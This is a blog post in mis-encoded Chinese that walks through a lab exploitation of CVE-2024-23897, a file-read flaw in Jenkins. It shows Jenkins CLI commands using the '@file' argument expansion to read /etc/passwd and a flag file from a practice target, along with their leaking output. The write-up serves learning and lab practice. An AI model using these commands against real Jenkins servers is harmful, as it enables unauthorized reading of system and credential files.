---
title: æ˜¥ç§‹äº‘é•œ CVE-2024-23897
tags: [penetration]
date: 2024-10-16 00:00:02
categories: [penetration]
excerpt: é€šè¿‡helpè¯»flag
---

## CVE-2024-23897

ç¯å¢ƒåœ°å€ï¼šhttps://yunjing.ichunqiu.com/cve/detail/1172

é¦–å…ˆçœ‹ä¸€ä¸‹ä»‹ç»

```
Jenkins 2.441åŠæ›´æ—©ç‰ˆæœ¬ï¼Œä»¥åŠLTS 2.426.2åŠæ›´æ—©ç‰ˆæœ¬æ²¡æœ‰ç¦ç”¨å…¶CLIå‘½ä»¤è§£æå™¨çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½ä¼šå°†å‚æ•°ä¸­'@'å­—ç¬¦åè·Ÿçš„æ–‡ä»¶è·¯å¾„æ›¿æ¢ä¸ºè¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…è¯»å–Jenkinsæ§åˆ¶å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚
```

è¿™å…¶å®å°±æ˜¯nvdä¸Šçš„æ¼æ´æè¿°ç¿»è¯‘äº†ä¸€ä¸‹ï¼Œç„¶åçœ‹åˆ°è¿™ä¸ªJenkinså¥½åƒä¹Ÿä¸æ˜¯å¼€æºçš„ï¼Œå…‰æ˜¯è¿™ç§æè¿°æˆ‘è¿™ç§èœé¸¡æ€ä¹ˆç†è§£å¾—äº†ğŸ˜¶â€ğŸŒ«ï¸ï¼ˆ

åªèƒ½å»æœæœ‰æ²¡æœ‰ä»€ä¹ˆç°æˆçš„ä¸œè¥¿æ¥æŠ„äº†

é¦–å…ˆæ˜¯nvdä¸Šè¿™ä¸ªæ¼æ´çš„ç•Œé¢ [NVD - CVE-2024-23897 (nist.gov)](https://nvd.nist.gov/vuln/detail/CVE-2024-23897)

![](/img/pene/9.png)

åœ¨References to Advisories, Solutions, and Toolsé‡Œç»™äº†ä¸€äº›é“¾æ¥ï¼Œç¬¬äºŒä¸ªé“¾æ¥æˆ‘ç‚¹å¼€ä¸€çœ‹è¿™ä¸å°±æ˜¯ç°æˆçš„expå˜›ï¼Œè¿™ä¸ç›´æ¥æŠ„è¿‡æ¥è¿è¡Œä¸€ä¸‹å°±å®Œäº†

ç„¶è€Œå®é™…æ²¡è¿™ä¹ˆç®€å•ï¼Œè¿™expæ ¹æœ¬æ²¡è·‘é€šğŸ˜¶â€ğŸŒ«ï¸ï¼Œç„¶åä¹Ÿçœ‹ä¸æ‡‚ã€‚å®ƒå¼€äº†ä¸¤ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹å‘äº†ä¸€ä¸ªè¯·æ±‚ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦å¼„ä¸¤ä¸ªçº¿ç¨‹ä¸æ‡‚ï¼Œé‚£äºŒè¿›åˆ¶çš„http bodyåˆæ˜¯å•¥ä¹Ÿä¸æ‡‚ğŸ˜­

åˆæ˜¯ä¸€é¡¿ä¹±æœï¼Œäºæ˜¯å‘ç°äº†è¿™ä¸¤ç¯‡æ–‡ç« ï¼š

[Jenkinsæ–‡ä»¶è¯»å–æ¼æ´æ‹¾é— CVE-2024-23897](https://cloud.tencent.com/developer/article/2384213)

[CVE-2024-23897æ¼æ´è§£æ ](https://www.freebuf.com/articles/neopoints/391038.html)

### åˆ©ç”¨

é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œæ˜¯è¿™ä¸ªjenkinsè½¯ä»¶æœ¬èº«æäº†ä¸€ä¸ªjavaçš„å®¢æˆ·ç«¯ï¼Œä»–ä¼šå¸®ç”¨æˆ·å‘é€ä¸€äº›è¯·æ±‚åˆ°webä¸Šï¼Œæ¥å®ç°ä¸€äº›åŠŸèƒ½ï¼ˆå°±åƒå†™å¥½äº†ä¸€äº›webæ¥å£ï¼Œç„¶åç»™ä½ é›†æˆäº†ä¸€ä¸‹ï¼‰

æ ¹æ®æ–‡ç« ä»‹ç»ï¼Œè¿™ä¸ªå®¢æˆ·ç«¯å¯ä»¥åœ¨ `/jnlpJars/jenkins-cli.jar`èµ„æºè·¯å¾„ä¸‹ä¸‹è½½ï¼Œæˆ‘åœ¨æ˜¥ç§‹äº‘é•œçš„é¶æœºä¸ŠæˆåŠŸä¸‹ä¸‹æ¥äº†

ç„¶åç¬¬äºŒæ­¥ï¼Œæ˜¯jenkinsæœ¬èº«ä¼šè°ƒç”¨args4jè¿™ä¸ªå¼€æºçš„å‚æ•°è§£æå·¥å…·ï¼Œç„¶åè¿™ä¸ªå·¥å…·çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯ï¼Œä¼šæŠŠå‚æ•°ä¸­ï¼Œä»¥`@`å¼€å¤´çš„å†…å®¹ï¼Œè§£ææˆä¸€ä¸ªæ–‡ä»¶åï¼Œä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹æ¥æ›¿æ¢è¿™ä¸ªå‚æ•°

è‡³äºå¦‚ä½•ä½¿ç”¨å‚æ•°å»è°ƒç”¨è¿™ä¸ªcliå·¥å…·

```zsh
java -jar jenkins-cli.jar -s <ip>:<port> -http ....
```

ä½†æ˜¯æˆ‘æ‰§è¡Œäº†ä¸€ä¸ªversionçš„å‘½ä»¤ä¼šæŠ¥é”™

```
â””â”€$ java -jar jenkins-cli.jar -s http://8.147.129.74:31171 -http version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: anonymous is missing the Overall/Read permission
```

å¦‚æœJenkinsç³»ç»Ÿå…³é—­äº†åŒ¿åç”¨æˆ·å¯è¯»åŠŸèƒ½ï¼Œå¤§éƒ¨åˆ†çš„cliå‘½ä»¤ä¹Ÿå°±æ— æ³•è°ƒç”¨ï¼Œåªæœ‰helpå’Œwho-am-iä¾‹å¤–

```zsh
â””â”€$ java -jar jenkins-cli.jar -s http://8.147.129.74:31171 -http help "@/etc/passwd"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
```

å®é™…ä¸Šè¿™ç§@ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºå‚æ•°ï¼Œæ¯ä¸€è¡Œéƒ½ä¼šå½“åšä¸€ä¸ªç‹¬ç«‹çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´è¡Œæ•°å¾ˆå¤šçš„æ–‡ä»¶åªä¼šå±•ç¤ºå¼€å¤´ï¼Œä½†æ˜¯å¦‚æœæ–‡ä»¶åªæœ‰ä¸€è¡Œä¹Ÿè¯»ä¸å‡ºæ¥

```zsh
â””â”€$ java -jar jenkins-cli.jar -s http://8.147.129.74:31171 -http help "@/flag"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: You must authenticate to access this Jenkins.
Jenkins CLI
```

éœ€è¦å¤šåŠ å‡ ä¸ªå‚æ•°

```zsh
â””â”€$ java -jar jenkins-cli.jar -s http://8.147.129.74:31171 -http help 1 "@/flag"             
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: Too many arguments: flag{52d6bf17-24af-49a1-a62b-f4b0147c133e}
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: 1)
```

è¿™æ ·ä¹Ÿå¯ä»¥

```zsh
â””â”€$ java -jar jenkins-cli.jar -s http://8.147.129.74:31171 -http help "@/flag" "@/etc/passwd"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: flag{52d6bf17-24af-49a1-a62b-f4b0147c13
           3e})
```



